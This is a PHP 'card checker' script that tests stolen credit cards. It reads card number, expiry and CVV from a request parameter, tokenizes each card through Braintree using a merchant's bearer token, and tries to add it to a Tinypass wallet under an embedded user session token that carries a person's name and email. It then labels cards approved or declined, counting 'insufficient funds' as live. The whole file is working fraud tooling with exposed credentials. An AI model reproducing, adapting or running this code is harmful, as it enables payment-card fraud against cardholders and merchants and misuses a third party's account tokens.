<?php
error_reporting(0);
date_default_timezone_set('America/New_York');
require_once 'vendor/autoload.php'; 

/*
 * Simple per-IP rate limiter:
 * - Allows 1 request per 60 seconds per IP.
 * - Stores last request times in rate_limit.json (file-based, flock-protected).
 * - When blocked, returns a JSON + plain message with remaining seconds.
 *
 * NOTE: This does NOT sleep the PHP process (that would be bad for concurrency).
 *       It simply refuses requests made too quickly and tells the client how long to wait.
 */

define('RATE_LIMIT_FILE', __DIR__ . '/rate_limit.json');
define('RATE_LIMIT_SECONDS', 125); // allowed interval between requests (seconds)

/**
 * Safely get client IP (respects common proxy header if present).
 */
function get_client_ip()
{
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    // Common header used by proxies/load-balancers (only trust if present)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // X-Forwarded-For can contain comma separated list, take first
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($parts[0]);
    }
    return $ip;
}

/**
 * Read rate-limit store (JSON) with flock
 */
function read_rate_store()
{
    $file = RATE_LIMIT_FILE;
    if (!file_exists($file)) {
        // initialize empty store
        file_put_contents($file, json_encode(new stdClass()));
    }
    $fh = fopen($file, 'r');
    if (!$fh) return [];
    flock($fh, LOCK_SH);
    $contents = stream_get_contents($fh);
    flock($fh, LOCK_UN);
    fclose($fh);
    $data = json_decode($contents, true);
    return is_array($data) ? $data : [];
}

/**
 * Write rate-limit store (JSON) with flock
 */
function write_rate_store($data)
{
    $file = RATE_LIMIT_FILE;
    $fh = fopen($file, 'c+');
    if (!$fh) return false;
    flock($fh, LOCK_EX);
    ftruncate($fh, 0);
    rewind($fh);
    fwrite($fh, json_encode($data));
    fflush($fh);
    flock($fh, LOCK_UN);
    fclose($fh);
    return true;
}

/**
 * Enforce rate limit for the client's IP.
 * Returns:
 *  - [true, 0] if allowed
 *  - [false, $remainingSeconds] if blocked
 */
function enforce_rate_limit()
{
    $ip = get_client_ip();
    $store = read_rate_store();
    $now = time();

    $last = isset($store[$ip]) ? intval($store[$ip]) : 0;
    $elapsed = $now - $last;

    if ($elapsed < RATE_LIMIT_SECONDS) {
        $remaining = RATE_LIMIT_SECONDS - $elapsed;
        return [false, $remaining];
    }

    // allowed: update store
    $store[$ip] = $now;
    write_rate_store($store);
    return [true, 0];
}

/* ------------------ Rate limit check ------------------ */
list($allowed, $remaining) = enforce_rate_limit();

if (!$allowed) {
    // Return a 429 Too Many Requests status (optional) and message
    http_response_code(429);
    $msg = "Rate limited — please try again after {$remaining} seconds.";
    // If you want the exact wording the original requested (60 mins), modify accordingly,
    // but using seconds is less confusing and accurate for a 60 second limit.
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'success' => false,
        'error' => 'rate_limited',
        'message' => $msg,
        'retry_after_seconds' => $remaining
    ]);
    exit;
}

/* ------------------ Existing logic (revamped/cleaned) ------------------ */

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function rebootproxys()
{
    // If there is no proxy file, just return empty string
    $proxyFile = __DIR__ . '/proxy.txt';
    if (!file_exists($proxyFile)) return '';
    $proxySocks4 = file($proxyFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$proxySocks4) return '';
    $myproxy = rand(0, count($proxySocks4) - 1);
    $proxySocks = trim($proxySocks4[$myproxy]);
    return $proxySocks;
}

$proxySocks4 = isset($_GET['proxy']) ? $_GET['proxy'] : '';
$lista = isset($_GET['lista']) ? $_GET['lista'] : '';

$parts = multiexplode(array(':', '|'), $lista);
$cc  = $parts[0] ?? '';
$mes = $parts[1] ?? '';
$ano = $parts[2] ?? '';
$cvv = $parts[3] ?? '';

function GetStr($string, $start, $end)
{
    if ($string === null) return '';
    $str = explode($start, $string);
    if (count($str) < 2) return '';
    $str = explode($end, $str[1]);
    return $str[0];
}

if (file_exists(getcwd() . '/cookie.txt')) {
    @unlink(getcwd() . '/cookie.txt');
}

/* Fetch a random U.S. user (graceful on failure) */
$get = @file_get_contents('https://randomuser.me/api/1.2/?nat=us');
$data = $get ? json_decode($get, true) : null;

$first_name = $data['results'][0]['name']['first'] ?? null;
$last_name  = $data['results'][0]['name']['last'] ?? null;
$email      = $data['results'][0]['email'] ?? null;

if ($email) {
    $updated_email = str_replace('@example.com', '@gmail.com', $email);
} else {
    $updated_email = null;
}

/* Example: continue with your payment/curl logic below
 *
 * For demonstration, we'll just return the parsed values as JSON.
 * Replace this block with your actual callouts/processing.
 */
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);

// Your dynamic card variables (ensure defined earlier)
// $cc  = '4038390050500282';
// $mes = '06';
// $ano = '2026';
// $cvv = '808';

$postData = [
    "clientSdkMetadata" => [
        "source" => "client",
        "integration" => "custom",
        "sessionId" => "1fec8b7f-7e3b-4f1d-9c75-5d107f6c4227"
    ],
    "query" => "mutation TokenizeCreditCard(\$input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: \$input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
    "variables" => [
        "input" => [
            "creditCard" => [
                "number" => $cc,
                "expirationMonth" => $mes,
                "expirationYear" => $ano,
                "cvv" => $cvv
            ],
            "options" => ["validate" => false]
        ]
    ],
    "operationName" => "TokenizeCreditCard"
];

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));

$headers = [
  'accept: */*',
  'accept-encoding: gzip, deflate, br, zstd',
  'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
  'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NjE3NDQ4MTAsImp0aSI6IjIzMDUxMzcyLTE1OTEtNDU5Ny1hNmY5LWIxNDQ5OGViZDViYSIsInN1YiI6InhwYjZkM3B0NjJocjRtMjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InhwYjZkM3B0NjJocjRtMjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IlNvdXJjZU1lZGlhX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVJYNmxKLUFwbWxKdkx0aVhNekJFSU1hTmdHb0RNTURiaXluc2VYZDJSZzhTc1cwLWcwN2ZtQ25HcVpqejYtUXVqOXp4VWVSRXJIYmRiM0wifX0.dYRqa5gvYQ0AbtRyq-e50Fj7npTco59Kg1FKogDt7U8Nw6WsPICfTcbQ75-YQbt7BALF4nNY70V3dIVrJF48OA',
  'braintree-version: 2018-05-10',
  'content-type: application/json',
  'origin: https://assets.braintreegateway.com',
  'referer: https://assets.braintreegateway.com/',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// Cookies
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

// Execute request
$response = curl_exec($ch);

if (curl_errno($ch)) {
    die('cURL Error: ' . curl_error($ch));
}

curl_close($ch);

// Decode response
$response_data = json_decode($response, true);

// Extract token and BIN
$token = $response_data['data']['tokenizeCreditCard']['token'] ?? null;
$bin   = $response_data['data']['tokenizeCreditCard']['creditCard']['bin'] ?? null;

///echo "<h3>Braintree Response:</h3>";
///echo "Token: " . htmlspecialchars($token) . "<br>";
///echo "BIN: " . htmlspecialchars($bin) . "<br>";

// Stop if token missing
if (!$token) {
    die("<strong>No token generated — stopping.</strong>");
}

// ========================
// 3. MYCAUSE API REQUEST
// ========================
$url = "https://buy.tinypass.com/checkout/myaccount/walletCreate?aid=XUnXNMUrFF";

$ch2 = curl_init();

$postFields = [
    "paymentMethodNonce" => $token,
    "source" => 4,
    "countryCode" => "IN",
    "needToApplyDefaultPaymentMethod" => false,
    "deviceData" => json_encode([
        "correlation_id" => "1fec8b7f-7e3b-4f1d-9c75-5d107f6c"
    ]),
    "nickname" => "",
    "cardType" => "Visa"
];

curl_setopt_array($ch2, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($postFields, JSON_UNESCAPED_SLASHES),
    CURLOPT_ENCODING => '', // auto-handle gzip/deflate/br
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_HTTPHEADER => [
        'accept: application/json, text/plain, */*',
        'accept-encoding: gzip, deflate, br, zstd',
        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
        'content-type: application/json;charset=UTF-8',
        'cookie: LANG=en_US',
        'ng-request: 1',
        'origin: https://buy.tinypass.com',
        'priority: u=1, i',
        'referer: https://buy.tinypass.com/checkout/myaccount/show?widget=myaccount&displayMode=inline&iframeId=uvE8eROaF0iETJnb&url=https%3A%2F%2Fwww.americanbanker.com%2Fmy-account&initialWidth=&initialHeight=&maxHeight=&v3ApiEndpoint=https%3A%2F%2Fbuy.tinypass.com%2Fapi%2Fv3&pianoIdUrl=https%3A%2F%2Fauth.americanbanker.com%2Fid%2F&width=1520.800048828125&pageViewId=mh6g11xd876rpdvl&tbc=%7Bkpex%7DVcnfASKKa8ktEfY6GYVeu63mtpBpfXRAjweZDfw0KXpbdlfuhYScMajK3gzYzHCd&browserId=mehniaewbz89cyyy&contentType=website&pageTitle=Membership&userState=registered&userProvider=piano_id&userToken=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2lkLnBpYW5vLmlvIiwic3ViIjoiUE5JS2h5MTJjc3hvdGZ4IiwiYXVkIjoiWFVuWE5NVXJGRiIsImxvZ2luX3RpbWVzdGFtcCI6IjE3NTU1NTM5NTY1ODYiLCJnaXZlbl9uYW1lIjoiVkVST05JUVVFIiwiZmFtaWx5X25hbWUiOiJMQUNST0lYIiwiZW1haWwiOiJ2ZXJvbmlxdWUxMmxhY3JvaXhAZ21haWwuY29tIiwiZXhwIjoxNzcxMzIxOTU2LCJpYXQiOjE3NTU1NTM5NTYsImp0aSI6IlRJTFBQWVNOZ290MTdtM28iLCJwYXNzd29yZFR5cGUiOiJwYXNzd29yZEV4cGlyZWQiLCJyIjp0cnVlLCJscyI6IkdPT0dMRSIsInNpIjoiMTE2MDc5NzE0MDE5MTc5NjU4MTMyIiwic2MiOjAsInRzYyI6Mn0.HiYDrkfeQh2YC7QTtUYUDkmlKSeXzjaybOWl0WY4VUo&aid=XUnXNMUrFF',
        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'sec-fetch-storage-access: active',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'userprovider: piano_id',
        'usertoken: eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2lkLnBpYW5vLmlvIiwic3ViIjoiUE5JS2h5MTJjc3hvdGZ4IiwiYXVkIjoiWFVuWE5NVXJGRiIsImxvZ2luX3RpbWVzdGFtcCI6IjE3NTU1NTM5NTY1ODYiLCJnaXZlbl9uYW1lIjoiVkVST05JUVVFIiwiZmFtaWx5X25hbWUiOiJMQUNST0lYIiwiZW1haWwiOiJ2ZXJvbmlxdWUxMmxhY3JvaXhAZ21haWwuY29tIiwiZXhwIjoxNzcxMzIxOTU2LCJpYXQiOjE3NTU1NTM5NTYsImp0aSI6IlRJTFBQWVNOZ290MTdtM28iLCJwYXNzd29yZFR5cGUiOiJwYXNzd29yZEV4cGlyZWQiLCJyIjp0cnVlLCJscyI6IkdPT0dMRSIsInNpIjoiMTE2MDc5NzE0MDE5MTc5NjU4MTMyIiwic2MiOjAsInRzYyI6Mn0.HiYDrkfeQh2YC7QTtUYUDkmlKSeXzjaybOWl0WY4VUo',
        'x-requested-with: XMLHttpRequest'
    ],
]);

$response2 = curl_exec($ch2);

if (curl_errno($ch2)) {
    echo "<h3 style='color:red;'>cURL Error:</h3><pre>" . curl_error($ch2) . "</pre>";
} else {
    ///echo "<h3>Wallet Create Response:</h3>";
    ///echo "<pre>" . htmlspecialchars($response2) . "</pre>";
}

curl_close($ch2);





////////////////////////////===[Card Response]

// Convert response to lowercase for consistent matching
// $response2 should contain the raw JSON/text from the gateway
$raw      = strtolower((string)($response2 ?? ''));
$decoded  = json_decode($response2, true);   // try to decode JSON
$errMsg   = null;

// If the API returned an errors[] array, pull the first message
if (is_array($decoded) && isset($decoded['errors'][0]['msg'])) {
    $errMsg = trim((string)$decoded['errors'][0]['msg']); // e.g., "Transaction cannot be processed at this time, please try again later."
}

// Defaults
$status = '#Reprovadas';
$badge  = 'badge-danger';
$desc   = $errMsg ?: 'Server Failure / Error Not Listed';

// ✅ Approvals / success patterns
if (
    strpos($raw, 'paymentmethod') !== false ||
    strpos($raw, 'insufficient funds') !== false ||
    strpos($raw, 'limit exceeded') !== false ||
    strpos($raw, 'card issuer declined cvv') !== false ||
    strpos($raw, '"success":true') !== false
) {
    $status = '#Aprovada';
    $badge  = 'badge-success';

    if (strpos($raw, 'paymentmethod') !== false)                 $desc = 'Nice New Payment method Added';
    elseif (strpos($raw, 'insufficient funds') !== false)        $desc = 'INSUFFICIENT FUNDS';
    elseif (strpos($raw, 'limit exceeded') !== false)            $desc = 'LIMIT EXCEEDED';
    elseif (strpos($raw, 'card issuer declined cvv') !== false)  $desc = 'Card Issuer Declined CVV';
    elseif (strpos($raw, '"success":true') !== false)            $desc = 'Card Authorised';
}

// Output
$status1 = $desc;

header('Content-Type: application/json; charset=utf-8');
echo json_encode([
    'success' => true,
    'message' => 'Request accepted. Processing...',
    'input' => [
        // 'lista' => $lista,
        'cc'    => $cc,
        'mes'   => $mes,
        'ano'   => $ano,
        'cvv'   => $cvv,
        'status' => $status1
    ]
]);

// Close curl handle if present
if (isset($ch) && is_resource($ch)) {
    curl_close($ch);
}
ob_flush();
///echo $response2;

?>
